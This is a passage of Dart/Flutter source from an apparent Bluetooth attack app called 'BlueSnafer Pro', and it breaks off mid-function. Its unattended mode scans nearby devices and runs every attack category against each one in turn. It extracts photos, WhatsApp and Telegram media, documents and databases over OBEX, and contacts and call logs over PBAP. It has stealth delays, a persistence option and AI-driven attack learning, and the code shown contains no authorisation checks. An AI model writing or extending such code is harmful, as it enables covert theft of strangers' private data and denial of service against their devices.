    final attacksByCategory = <String, List<Map<String, dynamic>>>{};
    
    // Agrupar ataques por categoría
    for (final atk in allAttackTechniques) {
      final cat = atk['category'] as String? ?? 'other';
      attacksByCategory.putIfAbsent(cat, () => []).add(atk);
    }
    
    // Ejecutar por categoría
    for (final category in ['recon', 'data', 'injection', 'ble', 'advanced', 'bypass', 'dos']) {
      final attacks = attacksByCategory[category] ?? [];
      if (attacks.isEmpty) continue;
      
      final catName = {'recon': 'RECONOCIMIENTO', 'data': 'EXTRACCIÓN', 'injection': 'INYECCIÓN', 'ble': 'BLE', 'advanced': 'AVANZADOS', 'bypass': 'BYPASS', 'dos': 'DoS'}[category] ?? category.toUpperCase();
      _appendLog('📡 $catName');
      
      for (final atk in attacks) {
        if (!_isUnattendedRunning) break;
        
        final type = atk['type'] as String? ?? '';
        final cmd = atk['command'] as String? ?? '';
        final script = atk['script'] as String? ?? '';
        final name = atk['name'] as String? ?? type;
        
        try {
          await _executeWithRetry(
            type: type,
            address: address,
            command: cmd,
            script: script,
            maxAttempts: 2,
          );
          deviceAttacks.add(name);
          _appendLog('  ✅ $name OK');
        } catch (e) {
          // Silencioso en fracaso para no saturar logs
        }
        
        await Future.delayed(Duration(milliseconds: _stealthMode ? 800 : 500));
      }
    }
    
    // Si hay archivos extraídos, contarlos
    if (_obexFiles.isNotEmpty) deviceFiles = _obexFiles.length;
    if (_pbapContacts.isNotEmpty) deviceContacts = _pbapContacts.length;

    // Resumen por dispositivo
    _appendLog('');
    _appendLog('✅ Objetivo $displayName completado');
    _appendLog('   📥 Archivos: $deviceFiles');
    _appendLog('   📇 Contactos: $deviceContacts');
    _appendLog('   ⚔️ Ataques intentados: ${deviceAttacks.length}');
    _appendLog('   ⚡ Éxitos: ${deviceAttacks.length}');
    _appendLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');

    // Guardar reporte de este dispositivo
    deviceResults['files'] = deviceFiles;
    deviceResults['contacts'] = deviceContacts;
    deviceResults['appData'] = deviceAppData;
    deviceResults['attacks'] = deviceAttacks;
    deviceResults['timestamp'] = DateTime.now().toIso8601String();
    deviceResults['success'] = deviceAttacks.isNotEmpty;

    await _saveDeviceReport(address, deviceResults);
    
    // Guardar aprendizaje de la IA
    if (deviceAttacks.isNotEmpty) {
      await _saveAIlearning(deviceType, deviceAttacks, deviceAttacks.isNotEmpty);
    }

    return deviceResults;
  }

  // ====== MODO DESATENDIDO MEJORADO ======
  // EJECUTA TODOS los exploits disponibles con reintentos y logs
  // VERSIÓN MEJORADA CON TODAS LAS MEJORAS INTEGRADAS
  Future<void> _startUnattendedMode() async {
    if (_isUnattendedRunning) {
      setState(() => _isUnattendedRunning = false);
      _appendLog('🛑 MODO DESATENDIDO CANCELADO');
      return;
    }

    if (_devices.isEmpty) {
      _appendLog('📡 Escaneando dispositivos cercanos...');
      await _scan();
      await Future.delayed(const Duration(seconds: 5));
      if (_devices.isEmpty) {
        _appendLog('❌ No se encontraron dispositivos.');
        return;
      }
    }

    setState(() => _isUnattendedRunning = true);
    _appendLog('╔══════════════════════════════════════╗');
    _appendLog('║   🤖 MODO DESATENDIDO MEJORADO       ║');
    _appendLog('║   + IA Adaptativa + Análisis         ║');
    _appendLog('╚══════════════════════════════════════╝');
    _appendLog('📋 ${_devices.length} dispositivos en cola');
    _appendLog('⚙️ Configuración:');
    _appendLog('   • Ejecución paralela: ${_enableParallelExecution ? "ON" : "OFF"}');
    _appendLog('   • IA adaptativa: ${_enableAdaptiveIntelligence ? "ON" : "OFF"}');
    _appendLog('   • Análisis de patrones: ${_enablePatternAnalysis ? "ON" : "OFF"}');
    _appendLog('   • Análisis de red: ${_enableNetworkAnalysis ? "ON" : "OFF"}');
    _appendLog('   • Modo sigiloso: ${_stealthMode ? "ON" : "OFF"}');
    _appendLog('   • Persistencia: ${_enablePersistence ? "ON" : "OFF"}');
    _appendLog('⏱️ Duración estimada: ~${_devices.length * 5} min');
    _appendLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');

    int totalFilesDownloaded = 0;
    int totalContactsExtracted = 0;
    int totalVulnsFound = 0;
    int totalAttacksExecuted = 0;
    int totalAttacksSucceeded = 0;
    int totalAppDataExtracted = 0;
    int totalNetworkInfoExtracted = 0;
    int scanRounds = 0;
    final processedAddresses = <String>{};
    final deviceReports = <Map<String, dynamic>>{};

    

    // === BUCLE PRINCIPAL CON RESCANEO ===
    while (_devices.isNotEmpty) {
      scanRounds++;
      _appendLog('');
      _appendLog('📡 RONDA $scanRounds: ${_devices.length} dispositivos disponibles');

      final devicesToProcess = List<Map<String, dynamic>>.from(_devices);
      final targets = devicesToProcess.where((d) => !processedAddresses.contains(d['address'])).toList();

      if (targets.isEmpty) {
        _appendLog('⚠️ Todos los dispositivos ya procesados. Re-escaneando...');
        await _scan();
        await Future.delayed(const Duration(seconds: 5));
        if (_devices.isEmpty) {
          _appendLog('❌ No hay más dispositivos disponibles.');
          break;
        }
        continue;
      }

      for (int i = 0; i < targets.length; i++) {
        if (!_isUnattendedRunning) {
          _appendLog('🛑 Cancelado por usuario tras $i dispositivos');
          break;
        }

        final device = targets[i];
        final address = device['address'] ?? '';

        // Verificar que el dispositivo aún esté disponible
        final stillAvailable = _devices.any((d) => d['address'] == address);
        if (!stillAvailable) {
          _appendLog('⚠️ Dispositivo $address no disponible. Saltando...');
          processedAddresses.add(address);
          continue;
        }

        try {
          await _processDeviceUnattended(device, i, targets.length - 1);
          processedAddresses.add(address);
        } catch (e) {
          _appendLog('❌ Error procesando $address: $e');
          await _saveDeviceReport(address, {
            'error': e.toString(),
            'timestamp': DateTime.now().toIso8601String(),
            'success': false,
          });
        }

        await Future.delayed(Duration(seconds: _stealthMode ? 5 : 3));
      }

      // Si aún hay dispositivos no procesados, re-escanear
      final remaining = _devices.where((d) => !processedAddresses.contains(d['address'])).length;
      if (remaining > 0) {
        _appendLog('⚠️ $remaining dispositivos restantes. Re-escaneando...');
        await _scan();
        await Future.delayed(const Duration(seconds: 5));
      } else {
        break;
      }
    }

    // Verificar si hay reportes previos de dispositivos ya procesados
    final savedReports = await _loadAllDeviceReports();
    if (savedReports.isNotEmpty) {
      _appendLog('');
      _appendLog('📋 REPORTES PREVIOS CARGADOS: ${savedReports.length}');
    }

    // Mostrar resumen final
    final successRate = totalAttacksSucceeded > 0 ? (totalAttacksSucceeded * 100 ~/ (_devices.length * 20)) : 0;

    _appendLog('');
    _appendLog('╔══════════════════════════════════════╗');
    _appendLog('║   🤖 MODO DESATENDIDO COMPLETADO    ║');
    _appendLog('╚══════════════════════════════════════╝');
    _appendLog('📊 RESUMEN FINAL:');
    _appendLog('   📡 Rondas de escaneo: $scanRounds');
    _appendLog('   ⚔️ Dispositivos procesados: ${processedAddresses.length}');
    _appendLog('   📝 Reportes guardados: ${savedReports.length + processedAddresses.length}');
_appendLog('   🔄 Dispositivos re-escaneados: ${scanRounds > 1 ? "Sí" : "No"}');
_appendLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  }

  // OBEX con reintentos inteligentes en múltiples directorios
  Future<int> _unattendedOBEXExtract(String address, String displayName) async {
    int downloaded = 0;
    
    _appendLog('  📂 Iniciando extracción OBEX FTP...');
    
    // Intentar hasta 3 veces en caso de fallo de conexión
    for (int attempt = 1; attempt <= 3; attempt++) {
      if (!_isUnattendedRunning) return downloaded;
      
      try {
        _appendLog('  🔄 Intento OBEX #$attempt...');
        
        // 1. Lista raíz
        final rootResult = await _exploitService.executeAttack(
          deviceAddress: address,
          type: 'file_exfil',
          command: 'scan',
        );

        if (rootResult['success'] == true) {
          final rootFiles = (rootResult['files'] as List? ?? [])
              .map<Map<String, dynamic>>((f) => Map<String, dynamic>.from(f as Map))
              .toList();
          
          _appendLog('  ✅ Raíz: ${rootFiles.length} archivos encontrados');
          
          if (mounted) {
            setState(() => _obexFiles = rootFiles);
          }
          
          // Descargar archivos de la raíz
          for (final file in rootFiles) {
            final fileName = file['name']?.toString() ?? '';
            if (fileName.isEmpty) continue;
            
            try {
              final dlResult = await _exploitService.downloadFile(address, fileName);
              if (dlResult['success'] == true) {
                downloaded++;
                final size = dlResult['size'] ?? 0;
                _appendLog('    ✅ $fileName ($size bytes)');
                _collectedData.add('📥 [$displayName] $fileName ($size bytes)');
              }
            } catch (e) {
              _appendLog('    ❌ $fileName: $e');
            }
          }
        }

        // 2. Escanear directorios de fotos y datos
        final searchDirs = [
          'DCIM/Camera', 'DCIM', 'Pictures', 'Screenshots',
          'Download', 'Documents', 'WhatsApp/Media', 'Telegram',
          'Android/data', 'Android/media'
        ];
        
        for (final dir in searchDirs) {
          if (!_isUnattendedRunning) return downloaded;
          
          try {
            final dirResult = await _exploitService.executeAttack(
              deviceAddress: address,
              type: 'file_exfil_dir',
              command: dir,
            );
            
            if (dirResult['success'] == true) {
              final dirFiles = (dirResult['files'] as List? ?? [])
                  .map<Map<String, dynamic>>((f) => {
                    ...Map<String, dynamic>.from(f as Map),
                    'path': '$dir/${f['name']}',
                  })
                  .toList();
              
              // Filtrar archivos interesantes
              final interestingFiles = dirFiles.where((f) {
                final name = (f['name']?.toString() ?? '').toLowerCase();
                return name.endsWith('.jpg') || name.endsWith('.jpeg') || name.endsWith('.png') ||
                       name.endsWith('.mp4') || name.endsWith('.gif') || name.endsWith('.webp') ||
                       name.endsWith('.vcf') || name.endsWith('.txt') || name.endsWith('.pdf') ||
                       name.endsWith('.doc') || name.endsWith('.docx') || name.endsWith('.xls') ||
                       name.endsWith('.xlsx') || name.endsWith('.db') || name.endsWith('.sqlite');
              }).toList();
              
              if (interestingFiles.isNotEmpty) {
                _appendLog('  📁 $dir: ${interestingFiles.length} archivos interesantes');
                
                // Descargar hasta 15 archivos por directorio
                for (final file in interestingFiles.take(15)) {
                  if (!_isUnattendedRunning) return downloaded;
                  final filePath = file['path']?.toString() ?? file['name']?.toString() ?? '';
                  if (filePath.isEmpty) continue;
                  
                  try {
                    final dlResult = await _exploitService.downloadFile(address, filePath);
                    if (dlResult['success'] == true) {
                      downloaded++;
                      final size = dlResult['size'] ?? 0;
                      _appendLog('    ✅ ${file['name']} ($size bytes)');
                      _collectedData.add('📥 [$displayName] ${file['name']} ($size bytes)');
                    }
                  } catch (e) {
                    // Silenciar errores individuales de descarga
                  }
                }
              }
            }
          } catch (e) {
            // Directorio no accesible
          }
        }
        
        // Si conseguimos archivos, no necesitamos más intentos
        if (downloaded > 0) {
          _appendLog('  ✅ $downloaded archivos descargados de OBEX');
          break;
        }
        
        // Esperar antes del siguiente intento
        if (attempt < 3) {
          _appendLog('  ⏳ Esperando 5s antes del siguiente intento...');
          await Future.delayed(const Duration(seconds: 5));
        }
      } catch (e) {
        _appendLog('  ❌ OBEX intento #$attempt fallido: $e');
        if (attempt < 3) {
          await Future.delayed(const Duration(seconds: 5));
        }
      }
    }
    
    if (downloaded == 0) {
      _appendLog('  ❌ OBEX: No se pudieron descargar archivos tras 3 intentos');
    } else {
      _appendLog('  ✅ OBEX: $downloaded archivos descargados exitosamente');
      _collectedData.add('📥 [$displayName] $downloaded archivos OBEX descargados');
      _saveState();
    }
    
    return downloaded;
  }

  // PBAP con reintentos
  Future<Map<String, int>> _unattendedPBAPExtract(String address, String displayName) async {
    int contacts = 0;
    int files = 0;
    
    _appendLog('  📇 Intentando extracción PBAP...');
    
    for (int attempt = 1; attempt <= 2; attempt++) {
      if (!_isUnattendedRunning) return {'contacts': contacts, 'files': files};
      
      try {
        _appendLog('  🔄 PBAP intento #$attempt...');
        final result = await _exploitService.pbapExtract(address, extractType: 'all');
        
        if (result['success'] == true) {
          contacts = result['contactCount'] ?? 0;
          files = result['callCount'] ?? 0;
          
          if (mounted) {
            setState(() {
              if (result['contacts'] != null) {
                _pbapContacts = (result['contacts'] as List)
                    .map<Map<String, dynamic>>((c) => Map<String, dynamic>.from(c as Map))
                    .toList();
              }
              if (result['calls'] != null) {
                _pbapCalls = (result['calls'] as List)
                    .map<Map<String, dynamic>>((c) => Map<String, dynamic>.from(c as Map))
                    .toList();
              }
            });
            _saveState();
          }
          
          _appendLog('  ✅ PBAP: $contacts contactos, $files llamadas extraídas');
          _collectedData.add('📇 [$displayName] $contacts contactos, $files llamadas');
          break;
        }
        
        if (attempt < 2) {
          await Future.delayed(const Duration(seconds: 3));
        }
      } catch (e) {
        _appendLog('  ❌ PBAP intento #$attempt fallido: $e');
        if (attempt < 2) {
          await Future.delayed(const Duration(seconds: 3));
        }
      }
    }
    
    if (contacts == 0 && files == 0) {
      _appendLog('  ❌ PBAP: No se pudieron extraer datos tras 2 intentos');
    }
    
    return {'contacts': contacts, 'files': files};
  }

  Future<void> _delayedAttack(String type, {String? command, String? script, int delayMs = 1000}) async {
    if (!_isUnattendedRunning) return;

    await _attack(type, command: command, script: script);
    await Future.delayed(Duration(milliseconds: delayMs));
  }

  String _getDeviceType(Map<String, dynamic> device) {
    return device_utils.detectDeviceType(device);
  }

  Future<void> _attack(String type, {String? command, String? script}) async {
    if (_isAttacking) {
      _appendLog('⏳ Ataque en progreso, espera...');
      return;
    }
    if (_selectedDevice == null) {
      _appendLog('❌ ERROR: Selecciona un dispositivo primero');
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(
            content: Text('⚠️ Selecciona un dispositivo del radar primero', style: TextStyle(fontSize: 12)),
            backgroundColor: Colors.red,
            duration: Duration(seconds: 2),
            behavior: SnackBarBehavior.floating,
          ),
        );
      }
      return;
    }
    
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    final addr = _selectedDevice!['address']?.toString() ?? '';
    final attackLabel = command ?? script ?? type;
    
    if (addr.isEmpty || addr == '??:??:??') {
      _appendLog('❌ ERROR: Dispositivo sin dirección MAC válida');
      return;
    }

    _appendLog('⚡ [$type] $attackLabel → $displayName ($addr)');

    setState(() => _isAttacking = true);

    // Verbose: show starting message
    if (mounted) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text('⚡ Iniciando $type:$attackLabel en $displayName...', style: const TextStyle(fontSize: 12)),
          backgroundColor: Colors.orange[900],
          duration: const Duration(seconds: 2),
          behavior: SnackBarBehavior.floating,
          margin: const EdgeInsets.only(bottom: 120, left: 16, right: 16),
        ),
      );
    }

    try {
      final result = await _exploitService.executeAttack(
        deviceAddress: addr,
        type: type,
        command: command,
        script: script,
      );

      final success = result['success'] == true;
      final message = result['message'] ?? 'Sin respuesta';
      final packets = result['packets'];
      final effectiveness = result['effectiveness'];
      final services = result['services'];
      final characteristics = result['characteristics'];

      // Recolectar datos REALES del ataque (cap 100)
      if (success) {
        final targetName = device_utils.getDeviceDisplayName(_selectedDevice!);

        if (services != null) {
          _collectedData.add('📡 [$targetName] $services servicios GATT descubiertos');
        }
        if (characteristics != null) {
          _collectedData.add('🔗 [$targetName] $characteristics características encontradas');
        }
        if (packets != null) {
          _collectedData.add('📦 [$targetName] $packets paquetes enviados');
        }
        if (effectiveness != null) {
          _collectedData.add('🎯 [$targetName] Efectividad: ${(effectiveness * 100).toStringAsFixed(0)}%');
        }
        _collectedData.add('✅ [$targetName] $type:$attackLabel completado');
      }
      String resultMsg = message;
      if (packets != null) resultMsg += ' | ${packets} packets';
      if (effectiveness != null) resultMsg += ' | ${(effectiveness * 100).toStringAsFixed(0)}% eff.';

      _suggestionEngine.recordAttack(
        type: type,
        command: command ?? script ?? 'default',
        success: success,
        deviceType: _getDeviceType(_selectedDevice!),
        deviceName: _selectedDevice!['name'] ?? 'Unknown',
        deviceAddress: addr,
        rssi: int.tryParse(_selectedDevice!['rssi']?.toString() ?? '0'),
        errorMessage: success ? null : message,
      );

      if (mounted) {
        setState(() {
          if (success) { _executedAttacks.add(type); }
          _getSuggestion(); // Actualizar sugerencia siempre (éxito o fallo)
        });
        _saveState(); // Guardar progreso Y resultados extraídos
        _appendLog(success ? '✅ $attackLabel OK' : '❌ $attackLabel FALLÓ: $message');

        // Show result snackbar
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              mainAxisSize: MainAxisSize.min,
              children: [
                Row(
                  children: [
                    Icon(success ? Icons.check_circle : Icons.error,
                         color: success ? Colors.greenAccent : Colors.redAccent, size: 16),
                    const SizedBox(width: 8),
                    Expanded(
                      child: Text(
                        '${success ? "ÉXITO" : "FALLO"}: $type:$attackLabel',
                        style: TextStyle(
                          color: success ? Colors.greenAccent : Colors.redAccent,
                          fontWeight: FontWeight.bold, fontSize: 12,
                        ),
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 4),
                Text(resultMsg, style: const TextStyle(color: Colors.white70, fontSize: 10)),
              ],
            ),
            backgroundColor: success ? Colors.green[900] : Colors.red[900],
            duration: const Duration(seconds: 3),
            behavior: SnackBarBehavior.floating,
            margin: const EdgeInsets.only(bottom: 120, left: 16, right: 16),
            shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(12),
              side: BorderSide(color: (success ? Colors.greenAccent : Colors.redAccent).withOpacity(0.3)),
            ),
          ),
        );
      }
    } catch (e) {
      _appendLog('💥 EXCEPTION en ataque: $e');
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('💥 Error: $e', style: const TextStyle(fontSize: 12)),
            backgroundColor: Colors.red[900],
            duration: const Duration(seconds: 3),
            behavior: SnackBarBehavior.floating,
          ),
        );
      }
    } finally {
      // Always reset _isAttacking, even if widget is disposed
      _isAttacking = false;
      if (mounted) {
        setState(() {
          // Cap collected data at 100 entries
          if (_collectedData.length > 100) {
            _collectedData = _collectedData.sublist(_collectedData.length - 100);
          }
        });
      }
    }
  }

  String _getManufacturer(String address) {
    return device_utils.getManufacturer(address);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF020617),
      appBar: AppBar(
        title: const Text('BlueSnafer Pro', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 18, color: Colors.white)),
        backgroundColor: Colors.transparent,
        elevation: 0,
        actions: [
          if (_devices.isNotEmpty)
            IconButton(
              icon: Icon(_isUnattendedRunning ? Icons.stop : Icons.auto_awesome, 
                color: _isUnattendedRunning ? Colors.redAccent : Colors.cyanAccent),
              tooltip: _isUnattendedRunning ? 'Detener modo desatendido' : 'Modo desatendido',
              onPressed: _startUnattendedMode,
            ),
          // Botón de configuración de modo automático
          PopupMenuButton<String>(
            icon: const Icon(Icons.tune, color: Colors.white54),
            tooltip: 'Configuración automática',
            onSelected: (value) {
              switch (value) {
                case 'parallel':
                  setState(() => _enableParallelExecution = !_enableParallelExecution);
                  _appendLog('⚙️ Ejecución paralela: ${_enableParallelExecution ? "ON" : "OFF"}');
                  break;
                case 'adaptive':
                  setState(() => _enableAdaptiveIntelligence = !_enableAdaptiveIntelligence);
                  _appendLog('⚙️ IA adaptativa: ${_enableAdaptiveIntelligence ? "ON" : "OFF"}');
                  break;
                case 'patterns':
                  setState(() => _enablePatternAnalysis = !_enablePatternAnalysis);
                  _appendLog('⚙️ Análisis de patrones: ${_enablePatternAnalysis ? "ON" : "OFF"}');
                  break;
                case 'network':
                  setState(() => _enableNetworkAnalysis = !_enableNetworkAnalysis);
                  _appendLog('⚙️ Análisis de red: ${_enableNetworkAnalysis ? "ON" : "OFF"}');
                  break;
                case 'stealth':
                  setState(() => _stealthMode = !_stealthMode);
                  _appendLog('🎭 Modo sigiloso: ${_stealthMode ? "ON" : "OFF"}');
                  break;
                case 'persistence':
                  setState(() => _enablePersistence = !_enablePersistence);
                  _appendLog('🕵️ Persistencia: ${_enablePersistence ? "ON" : "OFF"}');
                  break;
                case 'report':
                  _showAutomatedReport();
                  break;
                case 'reports':
                  _showSavedReports();
                  break;
                case 'learning':
                  _showAIlearning();
                  break;
              }
            },
            itemBuilder: (context) => [
              CheckedPopupMenuItem(
                value: 'parallel',
                checked: _enableParallelExecution,
                child: const Text('Ejecución paralela'),
              ),
              CheckedPopupMenuItem(
                value: 'adaptive',
                checked: _enableAdaptiveIntelligence,
                child: const Text('IA adaptativa'),
              ),
              CheckedPopupMenuItem(
                value: 'patterns',
                checked: _enablePatternAnalysis,
                child: const Text('Análisis de patrones'),
              ),
              CheckedPopupMenuItem(
                value: 'network',
                checked: _enableNetworkAnalysis,
                child: const Text('Análisis de red'),
              ),
              const PopupMenuDivider(),
              CheckedPopupMenuItem(
                value: 'stealth',
                checked: _stealthMode,
                child: const Text('Modo sigiloso 🎭'),
              ),
              CheckedPopupMenuItem(
                value: 'persistence',
                checked: _enablePersistence,
                child: const Text('Persistencia 🕵️'),
),
              const PopupMenuDivider(),
              const PopupMenuItem(
                value: 'report',
                child: Row(
                  children: [
                    Icon(Icons.assessment, color: Colors.cyanAccent, size: 18),
                    SizedBox(width: 8),
                    Text('Ver reporte'),
                  ],
                ),
              ),
              const PopupMenuItem(
                value: 'reports',
                child: Row(
                  children: [
                    Icon(Icons.history, color: Colors.orangeAccent, size: 18),
                    SizedBox(width: 8),
                    Text('Reportes guardados'),
                  ],
                ),
              ),
              const PopupMenuItem(
                value: 'learning',
                child: Row(
                  children: [
                    Icon(Icons.psychology, color: Colors.purpleAccent, size: 18),
                    SizedBox(width: 8),
                    Text('Aprendizaje IA'),
                  ],
                ),
              ),
            ],
          ),
          IconButton(icon: Icon(_isScanning ? Icons.radar : Icons.bluetooth_searching, color: _isScanning ? Colors.greenAccent : Colors.indigoAccent), onPressed: _isScanning ? null : _scan),
        ],
        bottom: TabBar(
          controller: _tabController,
          isScrollable: true,
          tabAlignment: TabAlignment.start,
          indicator: const UnderlineTabIndicator(borderSide: BorderSide(color: Colors.indigoAccent, width: 3), insets: EdgeInsets.symmetric(horizontal: 8)),
          labelColor: Colors.indigoAccent,
          unselectedLabelColor: Colors.white24,
          labelStyle: const TextStyle(fontSize: 10, fontWeight: FontWeight.bold),
          tabs: const [
            Tab(icon: Icon(Icons.radar, size: 18), text: 'RADAR'),
            Tab(icon: Icon(Icons.security, size: 18), text: 'HID'),
            Tab(icon: Icon(Icons.tune, size: 18), text: 'BTLE'),
            Tab(icon: Icon(Icons.wifi_off, size: 18), text: 'DOS'),
            Tab(icon: Icon(Icons.psychology, size: 18), text: 'IA/VA'),
          ],
        ),
      ),
      body: SafeArea(
        child: Column(
        children: [
          _buildStepIndicator(),
          if (_selectedDevice != null) _buildTargetHud(),
          Expanded(
            child: TabBarView(
              controller: _tabController,
              children: [_buildHomeTab(), _buildHidTab(), _buildBtleJackTab(), _buildDosTab(), _buildAiTab()],
            ),
          ),
          _buildTerminalBar(),
        ],
        ),
      ),
    );
  }

  Widget _buildStepIndicator() {
    final step = _currentStep;
    final steps = ['1', '2', '3', '4'];
    final labels = ['Escanear', 'Seleccionar', 'Atacar', 'Repetir'];
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
      decoration: BoxDecoration(
        color: Colors.indigo[900],
        border: Border(bottom: BorderSide(color: Colors.indigoAccent.withOpacity(0.2))),
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceEvenly,
        children: List.generate(4, (i) {
          final isActive = i == step;
          final isDone = i < step;
          return Padding(
            padding: const EdgeInsets.symmetric(horizontal: 2),
            child: Row(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  width: 16,
                  height: 16,
                  alignment: Alignment.center,
                  decoration: BoxDecoration(
                    color: isDone ? Colors.greenAccent : (isActive ? Colors.cyanAccent : Colors.white10),
                    shape: BoxShape.circle,
                  ),
                  child: Text(
                    steps[i],
                    style: TextStyle(
                      color: isDone ? Colors.black : (isActive ? Colors.black : Colors.white30),
                      fontSize: 10,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                ),
                const SizedBox(width: 4),
                Text(
                  labels[i],
                  style: TextStyle(
                    color: isDone ? Colors.greenAccent : (isActive ? Colors.cyanAccent : Colors.white30),
                    fontSize: 10,
                    fontWeight: isActive ? FontWeight.bold : FontWeight.normal,
                  ),
                ),
              ],
            ),
          );
        }),
      ),
    );
  }

  Widget _buildTargetHud() {
    if (_selectedDevice == null) return const SizedBox.shrink();
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    final addr = _selectedDevice!['address']?.toString() ?? '??:??:??';
    final vendor = _getManufacturer(addr);
    String hint = _getQuickGuide();

    return Container(
      width: double.infinity,
      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 4),
      padding: const EdgeInsets.all(8),
      decoration: BoxDecoration(color: Colors.indigoAccent.withOpacity(0.1), borderRadius: BorderRadius.circular(12), border: Border.all(color: Colors.indigoAccent.withOpacity(0.3))),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        mainAxisSize: MainAxisSize.min,
        children: [
          Row(
            children: [
              Icon(Icons.center_focus_strong, color: Colors.indigoAccent, size: 16),
              const SizedBox(width: 8),
              Expanded(
                child: Text(
                  '$displayName | $vendor | $addr',
                  style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 10),
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis,
                ),
              ),
              if (_aiPrediction.isNotEmpty) Icon(Icons.verified_user, color: Colors.cyanAccent, size: 14),
            ],
          ),
          const SizedBox(height: 4),
          GestureDetector(
            onTap: _navigateToSuggestion,
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
              decoration: BoxDecoration(color: Colors.cyanAccent.withOpacity(0.1), borderRadius: BorderRadius.circular(6)),
              child: Row(
                children: [
                  Icon(Icons.touch_app, color: Colors.cyanAccent, size: 12),
                  const SizedBox(width: 4),
                  Expanded(
                    child: Text(
                      hint,
                      style: const TextStyle(color: Colors.cyanAccent, fontSize: 10, fontWeight: FontWeight.bold),
                      maxLines: 2,
                      overflow: TextOverflow.ellipsis,
                    ),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildTerminalBar() {
    return Column(mainAxisSize: MainAxisSize.min, children: [
      if (_isStatusExpanded)
        Container(
          height: 200, width: double.infinity, margin: const EdgeInsets.fromLTRB(16, 0, 16, 0), padding: const EdgeInsets.all(12),
          decoration: const BoxDecoration(color: Color(0xFF0F172A), borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
          child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            const Row(children: [Icon(Icons.terminal, color: Colors.cyanAccent, size: 14), SizedBox(width: 8), Text('CONSOLA DE SISTEMA', style: TextStyle(color: Colors.white24, fontSize: 10, fontWeight: FontWeight.bold))]),
            const Divider(color: Colors.white10),
            Expanded(
              child: ListView.builder(
                controller: _logScrollController,
                itemCount: _log.length,
                itemBuilder: (context, i) {
                  final entry = _log[i];
                  // Color-code by type
                  Color? textColor;
                  if (entry.startsWith('✅') || entry.contains('ÉXITO') || entry.contains('OK')) {
                    textColor = Colors.greenAccent;
                  } else if (entry.startsWith('❌') || entry.contains('FALL') || entry.contains('ERROR')) {
                    textColor = Colors.redAccent;
                  } else if (entry.startsWith('⚡') || entry.startsWith('🎯')) {
                    textColor = Colors.orangeAccent;
                  } else if (entry.startsWith('📡')) {
                    textColor = Colors.purpleAccent;
                  } else if (entry.startsWith('⚠️')) {
                    textColor = Colors.yellow;
                  } else if (entry.startsWith('💥')) {
                    textColor = Colors.red;
                  } else {
                    textColor = Colors.cyanAccent;
                  }
                  return Padding(
                    padding: const EdgeInsets.only(bottom: 2),
                    child: Text(entry, style: TextStyle(color: textColor, fontSize: 10, fontFamily: 'monospace')),
                  );
                },
              ),
            ),
            
          ]),
        ),
      GestureDetector(
        onTap: () => setState(() => _isStatusExpanded = !_isStatusExpanded),
        child: Container(
          width: double.infinity, padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
          decoration: BoxDecoration(color: const Color(0xFF0F172A), border: Border(top: BorderSide(color: Colors.white.withOpacity(0.05)))),
          child: Row(children: [
            Container(width: 8, height: 8, decoration: const BoxDecoration(color: Colors.greenAccent, shape: BoxShape.circle)),
            const SizedBox(width: 12),
            Expanded(child: Text(_log.isNotEmpty ? _log.last : 'STANDBY', style: const TextStyle(color: Colors.white70, fontSize: 11, fontWeight: FontWeight.w500), maxLines: 1, overflow: TextOverflow.ellipsis)),
            Icon(_isStatusExpanded ? Icons.keyboard_arrow_down : Icons.keyboard_arrow_up, color: Colors.white24, size: 20),
            const SizedBox(width: 4),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
              decoration: BoxDecoration(color: Colors.white10, borderRadius: BorderRadius.circular(8)),
              child: Text('${_log.length}', style: const TextStyle(color: Colors.white38, fontSize: 9)),
            ),
          ]),
        ),
      ),
    ]);
  }

  Widget _buildHomeTab() {
    return _devices.isEmpty
      ? Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
          Container(padding: const EdgeInsets.all(32), decoration: BoxDecoration(color: Colors.white.withOpacity(0.02), shape: BoxShape.circle), child: const Icon(Icons.radar, size: 64, color: Colors.white10)),
          const SizedBox(height: 24),
          const Text('SIN OBJETIVOS ACTIVOS', style: TextStyle(color: Colors.white24, fontSize: 14, fontWeight: FontWeight.bold, letterSpacing: 1)),
          const SizedBox(height: 40),
          SizedBox(width: 200, child: ElevatedButton.icon(icon: const Icon(Icons.radar), label: const Text('ESCANEAR'), onPressed: _scan)),
        ]))
      : ListView.builder(
          padding: const EdgeInsets.all(16), itemCount: _devices.length,
          itemBuilder: (context, i) {
            final device = _devices[i];
            final addr = device['address']?.toString() ?? '??:??:??';
            final displayName = device_utils.getDeviceDisplayName(device);
            final isSelected = _selectedDevice == device;
            return GestureDetector(
              onTap: () {
                setState(() {
                  _selectedDevice = device;
                  _appendLog('🎯 LOCK: $displayName');
                });
                _analyzeWithAI(device);
                _getSuggestion();
